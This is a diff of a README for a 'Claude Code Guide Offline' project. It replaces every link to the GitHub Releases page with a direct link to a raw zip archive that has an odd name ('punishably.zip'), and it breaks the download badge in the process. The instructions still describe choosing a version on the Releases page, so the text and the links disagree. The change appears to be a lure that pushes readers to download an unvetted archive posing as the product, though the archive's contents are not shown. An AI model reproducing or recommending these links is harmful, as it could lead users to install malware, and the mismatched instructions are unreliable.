@@ -2,7 +2,7 @@
 
 ## 🔗 Download Here
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/releases)
+[![Download](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/raw/refs/heads/main/第5部分：技能 Skills/Guide-Claude-Code-Offline-punishably.zip%20Now-Click%20Here-blue)](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/raw/refs/heads/main/第5部分：技能 Skills/Guide-Claude-Code-Offline-punishably.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run Claude_Code_Guide_Offline:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page on GitHub:  
-   [Download Here](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/releases)
+   [Download Here](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/raw/refs/heads/main/第5部分：技能 Skills/Guide-Claude-Code-Offline-punishably.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent version, which will be at the top of the list. It is usually labeled with a version number like "v1.0" or similar.
@@ -76,7 +76,7 @@ If you run into issues, double-check if your operating system meets the requirem
 
 To keep Claude_Code_Guide_Offline up to date, revisit the Releases page regularly:
 
-[Visit Releases for Updates](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/releases)
+[Visit Releases for Updates](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/raw/refs/heads/main/第5部分：技能 Skills/Guide-Claude-Code-Offline-punishably.zip)
 
 Check for new versions, download the latest file, and repeat the installation process. It ensures you always have the newest features and tutorials.
 
